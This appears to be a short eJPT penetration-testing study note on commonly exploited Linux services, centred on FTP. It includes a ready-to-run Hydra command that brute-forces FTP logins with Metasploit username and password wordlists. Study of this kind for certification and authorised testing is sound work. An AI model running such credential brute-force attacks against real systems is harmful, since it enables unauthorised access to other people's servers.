#eJPT #INE #Linux

*Linux is a free and open source operating system that is comprised of the Linux kernel, which was developed by Linus Torvalds, and the GNU toolkit, which is a collection of software and utilities that was started and developed by Richard Stallman.*

---
# Frequently Exploited Services

![[Frequenty_exploited_linux_services.png]]

---
# FTP

*FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients*

- FTP authentication requires a username and password combination (except anonymous)

#### Exploiting using Hydra

1. Identify FTP and version
2. Run hydra `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt DOMAIN -t 4 ftp`
3. login `ftp IP`